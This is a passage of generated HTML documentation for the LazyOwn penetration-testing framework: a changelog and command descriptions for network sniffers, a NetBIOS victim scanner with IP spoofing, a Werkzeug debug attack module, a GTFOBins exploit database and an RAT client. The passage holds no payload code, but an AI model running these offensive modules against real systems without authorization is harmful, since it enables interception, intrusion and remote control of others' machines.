the values are their associated IP addresses. :rtype: dict</p>
<h2 id="getprompt">getprompt</h2>
<p>Generate a command prompt string with network information and user
status.</p>
<p>:param: None</p>
<p>:returns: A string representing the command prompt with network
information and user status.</p>
<p>Manual execution: To manually get a prompt string with network
information and user status, ensure you have
<code>get_network_info()</code> implemented to return a dictionary of
network interfaces and their IPs. Then use the function to create a
prompt string based on the current user and network info.</p>
<p>Example: If the function <code>get_network_info()</code> returns: {
‘tun0’: ‘10.0.0.1’, ‘eth0’: ‘192.168.1.2’ }</p>
<p>And the user is root, the prompt string generated might be:
[LazyOwn👽10.0.0.1]# If the user is not root, it would be:
[LazyOwn👽10.0.0.1]$</p>
<p>If no ‘tun’ interface is found, the function will use the first
available IP or fallback to ‘127.0.0.1’.</p>
<h2 id="copy2clip">copy2clip</h2>
<p>Copia el texto proporcionado al portapapeles usando xclip.</p>
<p>Args: text (str): El texto que se desea copiar al portapapeles.</p>
<p>Example: copy2clip(“Hello, World!”)</p>
<h2 id="wrapper">wrapper</h2>
<p>internal wrapper of internal function to implement multiples rhost to
operate.</p>
<h1 id="changelog">Changelog</h1>
<ul>
<li>feature(parametrizar el despliegue): se agrega el parametro –no-test
para despliegues que no involucren cambios en la tool:D👽 LazyOwn on
HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>test(troubleshooting): deleting the tmp file but i cant sleep👽
LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>hotfix(delete qa command to option -c): bug: dont let beggin
scriptfast_run_as_r00t.sh, instruction was deletedline 6678👽 LazyOwn on
HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>test(despliegue): backup file del archivo lazyown creado en las
pruebas TODO: eliminar el archivo al terminar las pruebas, ahora toca
saber donde lo està creadno son muchas funciones xD, aun que creoq ue es
mi pequeño burpfuzzer que lo hace pero ya es tardeno lo veré hoy👽
LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>test(despliegue): de organizaciòn de archivos ovpn dentro del
directorio vpnse actualizo el timeout de las pruebas unitarias👽 LazyOwn
on HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>test(testmeneitor): probando el workflow de desplieguees el body de
la prueba de despliegue junto a testmineitor👽 LazyOwn on HackTheBox:
https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>feature(nuevo creador de index.html): crea el html de manera
automatizada con el script index.shscript realiza tareas de
actualizaciòn de la pagina web👽 LazyOwn on HackTheBox:
https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>feature(mejora CHANGELOG.sh): ahora actualiza usando
readmeneitor.pyutilizarà nuestro testmeneitor para probar que no subimos
codigo con bugs👽 LazyOwn on HackTheBox:
https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>feat(mejorando el tipo): cambio en el script CHANGELOG.shmejora la
descripcion de los tipos de commits👽 LazyOwn on HackTheBox:
https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>docs(docs): El cierre de una imagen en la documentación estaba mal
:)se modifico el CHANGELOG.sh que chulada de script👽 LazyOwn on
HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
https://www.reddit.com/r/LazyOwn/ 👽
https://grisuno.github.io/LazyOwn/</li>
<li>Nueva descripcion en el readme y probando el CHANGELOG.sh :)</li>
<li>ahora el changelog a docs :D en formato html</li>
<li>HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 Ahora
estamos en TryHackMe :D, nuestro QA Testmeneitor.py ya es màs
inteligente ya no se le olvida cerrar las tareas que abrio xD, todos los
comandos nuevos estan docuemntados en docs/COMMANDS.md y docs/UTILS.md
todas las funciones nuevas como copy2clip :P, y estrenamos CHANGELOG.md
y CHANGELOG.sh :D 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
some changes in the web pandoc README.md -f markdown -t html -s -o
README.html madremia que comandazo 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
some changes in the web pandoc README.md -f markdown -t html -s -o
README.html madremia que comandazo 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
some changes in the web 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
comming soon tryhackme 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
testmeneitor.py my new qa it’s new doing qa so… l:P, some commands news
base64encode, base64decode, rdp, all documented by my documentator
readmeneitor.py :P 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 new
fancy proompt :) 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 bug
fixing 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429
👽👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
3ast3r366 👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
commands documented at COMMANDS.md and new ultis documented at ULTIS.md
👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
commands documented at COMMANDS.md and new ultis documented at ULTIS.md
👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
commands documented at COMMANDS.md and new ultis documented at ULTIS.md
👽</li>
<li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
command launchpad to recon Linux OS 👽</li>
<li>Merge pull request #27 from grisuno/clcthulhu-patch-1</li>
<li>docs(update readme description): change of the description; Update
README.md</li>
</ul>
</body>
</html>
<!-- END README -->

<!-- contenido anterior -->

<!-- START COMMANDS -->
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>LazyOwn Framework Doc: COMMANDS.md</title>
  <style>
    html {
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 12px;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      html {
        background-color: white;
      }
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    svg {
      height: auto;
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
      font-size: 85%;
      margin: 0;
      hyphens: manual;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
</head>
<body>
<header id="title-block-header">
<h1 class="title">LazyOwn Framework Doc: COMMANDS.md</h1>
</header>
<h1 id="commands.md-documentation-by-readmeneitor.py">COMMANDS.md
Documentation by readmeneitor.py</h1>
<h2 id="xor_encrypt_decrypt">xor_encrypt_decrypt</h2>
<p>XOR Encrypt or Decrypt data with a given key</p>
<h2 id="init"><strong>init</strong></h2>
<p>Initializer for the LazyOwnShell class.</p>
<p>This method sets up the initial parameters and scripts for an
instance of the LazyOwnShell class. It initializes a dictionary of
parameters with default values and a list of script names that are part
of the LazyOwnShell toolkit.</p>
<p>Attributes: params (dict): A dictionary of parameters with their
default values. scripts (list): A list of script names included in the
toolkit. output (str): An empty string to store output or results.</p>
<h2 id="default">default</h2>
<p>Handles undefined commands, including aliases.</p>
<p>This method checks if a given command (or its alias) exists within
the class by attempting to find a corresponding method. If the command
or alias is not found, it prints an error message.</p>
<p>:param line: The command or alias to be handled. :type line: str
:return: None</p>
<h2 id="one_cmd">one_cmd</h2>
<p>Internal function to execute commands.</p>
<p>This method attempts to execute a given command using
<code>onecmd</code> and captures the output. It sets the
<code>output</code> attribute based on whether the command was executed
successfully or an exception occurred.</p>
<p>:param command: The command to be executed. :type command: str
:return: A message indicating the result of the command execution.
:rtype: str</p>
<h2 id="set">set</h2>
<p>Set a parameter value.</p>
<p>This function takes a line of input, splits it into a parameter and a
value, and sets the specified parameter to the given value if the
parameter exists.</p>
<p>:param line: A string containing the parameter and value to be set.
Expected format: ‘<parameter> <value>’. :type line: str :return: None
:raises: ValueError if the input line does not contain exactly two
elements.</p>
<h2 id="show">show</h2>
<p>Show the current parameter values.</p>
<p>This function iterates through the current parameters and their
values, printing each parameter and its associated value.</p>
<p>:param line: This parameter is not used in the function. :type line:
str :return: None</p>
<h2 id="list">list</h2>
<p>Lists all available scripts in the modules directory.</p>
<p>This method prints a list of available scripts in a formatted manner,
arranging them into columns. It shows each script with sufficient
spacing for readability.</p>
<p>:param line: This parameter is not used in the method. :type line:
str :return: None</p>
<h2 id="run">run</h2>
<p>Runs a specific LazyOwn script.</p>
<p>This method executes a script from the LazyOwn toolkit based on the
provided script name. If the script is not recognized, it prints an
error message. To see available scripts, use the <code>list</code> or
<code>help list</code> commands.</p>
<p>:param line: The command line input containing the script name. :type
line: str :return: None</p>
<h2 id="lazysearch">lazysearch</h2>
<p>Runs the internal module <code>modules/lazysearch.py</code>.</p>
<p>This method executes the <code>lazysearch</code> script from the
specified path, using the <code>binary_name</code> parameter from the
<code>self.params</code> dictionary. If <code>binary_name</code> is not
set, it prints an error message.</p>
<p>:return: None</p>
<h2 id="lazysearch_gui">lazysearch_gui</h2>
<p>Run the internal module located at
<code>modules/LazyOwnExplorer.py</code>.</p>
<p>This method executes the <code>LazyOwnExplorer.py</code> script,
which is used for graphical user interface (GUI) functionality within
the LazyOwn framework.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Calls <code>self.run_script</code> with
<code>LazyOwnExplorer.py</code> to execute the GUI module.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the
<code>modules/LazyOwnExplorer.py</code> script is present in the
<code>modules</code> directory. 2. Run the script with:
<code>python3 modules/LazyOwnExplorer.py</code></p>
<p>Example: To run <code>LazyOwnExplorer.py</code> directly, execute:
<code>python3 modules/LazyOwnExplorer.py</code></p>
<p>Note: - Ensure that the script has the appropriate permissions and
dependencies to run. - Verify that your environment supports GUI
operations if using this script in a non-graphical environment.</p>
<h2 id="lazyown">lazyown</h2>
<p>Run the internal module located at
<code>modules/lazyown.py</code>.</p>
<p>This method executes the <code>lazyown.py</code> script, which is a
core component of the LazyOwn framework.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Calls <code>self.run_script</code> with <code>lazyown.py</code> to
execute the script.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the <code>modules/lazyown.py</code>
script is present in the <code>modules</code> directory. 2. Run the
script with: <code>python3 modules/lazyown.py</code></p>
<p>Example: To run <code>lazyown.py</code> directly, execute:
<code>python3 modules/lazyown.py</code></p>
<p>Note: - Ensure that the script has the appropriate permissions and
dependencies to run.</p>
<h2 id="update_db">update_db</h2>
<p>Run the internal module located at
<code>modules/update_db.sh</code>.</p>
<p>This method executes the <code>update_db.sh</code> script to update
the database of binary exploitables from <code>gtofbins</code>.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Executes the <code>update_db.sh</code> script located in the
<code>modules</code> directory using <code>os.system</code>.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the
<code>modules/update_db.sh</code> script is present in the
<code>modules</code> directory. 2. Run the script with:
<code>./modules/update_db.sh</code></p>
<p>Example: To manually update the database, execute:
<code>./modules/update_db.sh</code></p>
<p>Note: - Ensure that the script has execute permissions. - The script
should be run with the necessary privileges if required.</p>
<h2 id="lazynmap">lazynmap</h2>
<p>Runs the internal module <code>modules/lazynmap.sh</code> for
multiple Nmap scans.</p>
<p>This method executes the <code>lazynmap</code> script, using the
current working directory and the <code>rhost</code> parameter from the
<code>self.params</code> dictionary as the target IP. If
<code>rhost</code> is not set, it prints an error message.</p>
<p>:return: None</p>
<h2 id="lazywerkzeugdebug">lazywerkzeugdebug</h2>
<p>Run the internal module located at
<code>modules/lazywerkzeug.py</code> in debug mode.</p>
<p>This method executes the <code>lazywerkzeug.py</code> script with the
specified parameters for remote and local hosts and ports. It is used to
test Werkzeug in debug mode.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>rhost</code>, <code>lhost</code>,
<code>rport</code>, and <code>lport</code> values from
<code>self.params</code>.</li>
<li>Checks if all required parameters are set. If not, prints an error
message and returns.</li>
<li>Calls <code>self.run_script</code> with <code>lazywerkzeug.py</code>
and the specified parameters.</li>
</ol>
<p>:param rhost: The remote host address. :type rhost: str</p>
<p>:param lhost: The local host address. :type lhost: str</p>
<p>:param rport: The remote port number. :type rport: int</p>
<p>:param lport: The local port number. :type lport: int</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code>,
<code>lhost</code>, <code>rport</code>, and <code>lport</code> are set
in <code>self.params</code>. 2. The script
<code>modules/lazywerkzeug.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazywerkzeug.py &lt;rhost&gt; &lt;rport&gt; &lt;lhost&gt; &lt;lport&gt;</code></p>
<p>Example: To run <code>lazywerkzeug.py</code> with <code>rhost</code>
set to <code>"127.0.0.1"</code>, <code>rport</code> to
<code>5000</code>, <code>lhost</code> to <code>"localhost"</code>, and
<code>lport</code> to <code>8000</code>, set:
<code>self.params["rhost"] = "127.0.0.1"</code>
<code>self.params["rport"] = 5000</code>
<code>self.params["lhost"] = "localhost"</code>
<code>self.params["lport"] = 8000</code> Then call:
<code>run_lazywerkzeugdebug()</code></p>
<p>Note: - Ensure that <code>modules/lazywerkzeug.py</code> has the
appropriate permissions and dependencies to run. - Verify that the
specified hosts and ports are correct and available.</p>
<h2 id="lazygath">lazygath</h2>
<p>Run the internal module located at <code>modules/lazygat.sh</code>.
to gathering the sistem :)</p>
<p>This method executes the <code>lazygat.sh</code> script located in
the <code>modules</code> directory with <code>sudo</code>
privileges.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the current working directory.</li>
<li>Executes the <code>lazygat.sh</code> script using <code>sudo</code>
to ensure it runs with elevated permissions.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the <code>modules/lazygat.sh</code>
script is present in the <code>modules</code> directory. 2. Run the
script with: <code>sudo ./modules/lazygat.sh</code></p>
<p>Example: To manually run the script with elevated privileges,
execute: <code>sudo ./modules/lazygat.sh</code></p>
<p>Note: - Ensure that the script has execute permissions. - The script
should be run with <code>sudo</code> if it requires elevated
privileges.</p>
<h2 id="lazynmapdiscovery">lazynmapdiscovery</h2>
<p>Runs the internal module <code>modules/lazynmap.sh</code> with
discovery mode.</p>
<p>This method executes the <code>lazynmap</code> script in discovery
mode. It uses the current working directory for locating the script.</p>
<p>:return: None</p>
<h2 id="lazysniff">lazysniff</h2>
<p>Run the sniffer internal module located at
<code>modules/lazysniff.py</code> with the specified parameters.</p>
<p>This method executes the script with the following arguments:</p>
<ul>
<li><code>device</code>: The network interface to be used for sniffing,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>device</code> value from
<code>self.params</code>.</li>
<li>Sets up the environment variables <code>LANG</code> and
<code>TERM</code> to ensure proper script execution.</li>
<li>Uses <code>subprocess.run</code> to execute the
<code>lazysniff.py</code> script with the <code>-i</code> option to
specify the network interface.</li>
</ol>
<p>:param device: The network interface to be used for sniffing. :type
device: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>device</code> is set in
<code>self.params</code>. 2. The script
<code>modules/lazysniff.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazysniff.py -i &lt;device&gt;</code></p>
<p>Example: To run <code>lazysniff</code> with <code>device</code> set
to <code>"eth0"</code>, set: <code>self.params["device"] = "eth0"</code>
Then call: <code>run_lazysniff()</code></p>
<p>Note: - Ensure that <code>modules/lazysniff.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the
network interface specified is valid and properly configured.</p>
<h2 id="lazyftpsniff">lazyftpsniff</h2>
<p>Run the sniffer ftp internal module located at
<code>modules/lazyftpsniff.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>device</code>: The network interface to be used for sniffing,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>device</code> value from
<code>self.params</code>.</li>
<li>Sets up the environment variables <code>LANG</code> and
<code>TERM</code> to ensure proper script execution.</li>
<li>Uses <code>subprocess.run</code> to execute the
<code>lazyftpsniff.py</code> script with the <code>-i</code> option to
specify the network interface.</li>
</ol>
<p>:param device: The network interface to be used for sniffing. :type
device: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>device</code> is set in
<code>self.params</code>. 2. The script
<code>modules/lazyftpsniff.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyftpsniff.py -i &lt;device&gt;</code></p>
<p>Example: To run <code>lazyftpsniff</code> with <code>device</code>
set to <code>"eth0"</code>, set:
<code>self.params["device"] = "eth0"</code> Then call:
<code>run_lazyftpsniff()</code></p>
<p>Note: - Ensure that <code>modules/lazyftpsniff.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the
network interface specified is valid and properly configured.</p>
<h2 id="lazynetbios">lazynetbios</h2>
<p>Run the internal module to search netbios vuln victims, located at
<code>modules/lazynetbios.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>startip</code>: The starting IP address for the NetBIOS scan,
specified in <code>self.params</code>.</li>
<li><code>endip</code>: The ending IP address for the NetBIOS scan,
specified in <code>self.params</code>.</li>
<li><code>spoof_ip</code>: The IP address to be used for spoofing,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>startip</code>, <code>endip</code>, and
<code>spoof_ip</code> values from <code>self.params</code>.</li>
<li>Uses <code>subprocess.run</code> to execute the
<code>lazynetbios.py</code> script with the specified parameters.</li>
</ol>
<p>:param startip: The starting IP address for the NetBIOS scan. :type
startip: str</p>
<p>:param endip: The ending IP address for the NetBIOS scan. :type
endip: str</p>
<p>:param spoof_ip: The IP address to be used for spoofing. :type
spoof_ip: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>startip</code>,
<code>endip</code>, and <code>spoof_ip</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazynetbios.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazynetbios.py &lt;startip&gt; &lt;endip&gt; &lt;spoof_ip&gt;</code></p>
<p>Example: To run <code>lazynetbios</code> with <code>startip</code>
set to <code>"192.168.1.1"</code>, <code>endip</code> set to
<code>"192.168.1.10"</code>, and <code>spoof_ip</code> set to
<code>"192.168.1.100"</code>, set:
<code>self.params["startip"] = "192.168.1.1"</code>
<code>self.params["endip"] = "192.168.1.10"</code>
<code>self.params["spoof_ip"] = "192.168.1.100"</code> Then call:
<code>run_lazynetbios()</code></p>
<p>Note: - Ensure that <code>modules/lazynetbios.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the IP
addresses are correctly set and valid for the NetBIOS scan.</p>
<h2 id="lazyhoneypot">lazyhoneypot</h2>
<p>Run the internal module located at
<code>modules/lazyhoneypot.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>email_from</code>: The email address from which messages will
be sent, specified in <code>self.params</code>.</li>
<li><code>email_to</code>: The recipient email address, specified in
<code>self.params</code>.</li>
<li><code>email_username</code>: The username for email authentication,
specified in <code>self.params</code>.</li>
<li><code>email_password</code>: The password for email authentication,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>email_from</code>, <code>email_to</code>,
<code>email_username</code>, and <code>email_password</code> values from
<code>self.params</code>.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyhoneypot.py</code> script with the provided email
parameters.</li>
</ol>
<p>:param email_from: The email address from which messages will be
sent. :type email_from: str</p>
<p>:param email_to: The recipient email address. :type email_to: str</p>
<p>:param email_username: The username for email authentication. :type
email_username: str</p>
<p>:param email_password: The password for email authentication. :type
email_password: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>email_from</code>,
<code>email_to</code>, <code>email_username</code>, and
<code>email_password</code> are set in <code>self.params</code>. 2. The
script <code>modules/lazyhoneypot.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyhoneypot.py --email_from &lt;email_from&gt; --email_to &lt;email_to&gt; --email_username &lt;email_username&gt; --email_password &lt;email_password&gt;</code></p>
<p>Example: To run <code>lazyhoneypot</code> with
<code>email_from</code> set to <code>"sender@example.com"</code>,
<code>email_to</code> set to <code>"recipient@example.com"</code>,
<code>email_username</code> set to <code>"user"</code>, and
<code>email_password</code> set to <code>"pass"</code>, set:
<code>self.params["email_from"] = "sender@example.com"</code>
<code>self.params["email_to"] = "recipient@example.com"</code>
<code>self.params["email_username"] = "user"</code>
<code>self.params["email_password"] = "pass"</code> Then call:
<code>run_lazyhoneypot()</code></p>
<p>Note: - Ensure that <code>modules/lazyhoneypot.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the email
credentials are correctly set for successful authentication and
operation.</p>
<h2 id="lazygptcli">lazygptcli</h2>
<p>Run the internal module to create Oneliners with Groq AI located at
<code>modules/lazygptcli.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>prompt</code>: The prompt to be used by the script, specified
in <code>self.params</code>.</li>
<li><code>api_key</code>: The API key to be set in the environment
variable <code>GROQ_API_KEY</code>, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>prompt</code> and <code>api_key</code> values
from <code>self.params</code>.</li>
<li>Checks if both <code>prompt</code> and <code>api_key</code> are set.
If either is missing, it prints an error message and returns.</li>
<li>Sets the environment variable <code>GROQ_API_KEY</code> with the
provided <code>api_key</code>.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazygptcli.py</code> script with the <code>--prompt</code>
argument.</li>
</ol>
<p>:param prompt: The prompt to be used by the script. :type prompt:
str</p>
<p>:param api_key: The API key for accessing the service. :type api_key:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>prompt</code> and
<code>api_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazygptcli.py</code> should be present in the
<code>modules</code> directory. 3. Set the environment variable
<code>GROQ_API_KEY</code> with the API key value. 4. Run the script
with:
<code>python3 modules/lazygptcli.py --prompt &lt;prompt&gt;</code></p>
<p>Example: To run <code>lazygptcli</code> with <code>prompt</code> set
to <code>"Your prompt"</code> and <code>api_key</code> set to
<code>"your_api_key"</code>, set:
<code>self.params["prompt"] = "Your prompt"</code>
<code>self.params["api_key"] = "your_api_key"</code> Then call:
<code>run_lazygptcli()</code></p>
<p>Note: - Ensure that <code>modules/lazygptcli.py</code> has the
appropriate permissions and dependencies to run. - The environment
variable <code>GROQ_API_KEY</code> must be correctly set for the script
to function.</p>
<h2 id="lazysearch_bot">lazysearch_bot</h2>
<p>Run the internal module GROQ AI located at
<code>modules/lazysearch_bot.py</code> with the specified
parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>prompt</code>: The prompt to be used by the script, specified
in <code>self.params</code>.</li>
<li><code>api_key</code>: The API key to be set in the environment
variable <code>GROQ_API_KEY</code>, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>prompt</code> and <code>api_key</code> values
from <code>self.params</code>.</li>
<li>Checks if both <code>prompt</code> and <code>api_key</code> are set.
If either is missing, it prints an error message and returns.</li>
<li>Sets the environment variable <code>GROQ_API_KEY</code> with the
provided <code>api_key</code>.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazysearch_bot.py</code> script with the <code>--prompt</code>
argument.</li>
</ol>
<p>:param prompt: The prompt to be used by the script. :type prompt:
str</p>
<p>:param api_key: The API key for accessing the service. :type api_key:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>prompt</code> and
<code>api_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazysearch_bot.py</code> should be present in the
<code>modules</code> directory. 3. Set the environment variable
<code>GROQ_API_KEY</code> with the API key value. 4. Run the script
with:
<code>python3 modules/lazysearch_bot.py --prompt &lt;prompt&gt;</code></p>
<p>Example: To run <code>lazysearch_bot</code> with <code>prompt</code>
set to <code>"Search query"</code> and <code>api_key</code> set to
<code>"your_api_key"</code>, set:
<code>self.params["prompt"] = "Search query"</code>
<code>self.params["api_key"] = "your_api_key"</code> Then call:
<code>run_lazysearch_bot()</code></p>
<p>Note: - Ensure that <code>modules/lazysearch_bot.py</code> has the
appropriate permissions and dependencies to run. - The environment
variable <code>GROQ_API_KEY</code> must be correctly set for the script
to function.</p>
<h2 id="lazymetaextract0r">lazymetaextract0r</h2>
<p>Run the Metadata extractor internal module located at
<code>modules/lazyown_metaextract0r.py</code> with the specified
parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>path</code>: The file path to be processed by the script,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the value for <code>path</code> from
<code>self.params</code>.</li>
<li>Checks if the <code>path</code> parameter is set. If not, it prints
an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyown_metaextract0r.py</code> script with the appropriate
argument.</li>
</ol>
<p>:param path: The file path to be processed by the script. :type path:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>path</code> is set in
<code>self.params</code>. 2. The script
<code>modules/lazyown_metaextract0r.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyown_metaextract0r.py --path &lt;path&gt;</code></p>
<p>Example: To run <code>lazyown_metaextract0r</code> with
<code>path</code> set to <code>/home/user/file.txt</code>, set:
<code>self.params["path"] = "/home/user/file.txt"</code> Then call:
<code>run_lazymetaextract0r()</code></p>
<p>Note: - Ensure that <code>modules/lazyown_metaextract0r.py</code> has
the appropriate permissions and dependencies to run.</p>
<h2 id="lazyownratcli">lazyownratcli</h2>
<p>Run the internal module located at
<code>modules/lazyownclient.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>lhost</code>: The IP address of the local host, specified in
<code>self.params</code>.</li>
<li><code>lport</code>: The port number of the local host, specified in
<code>self.params</code>.</li>
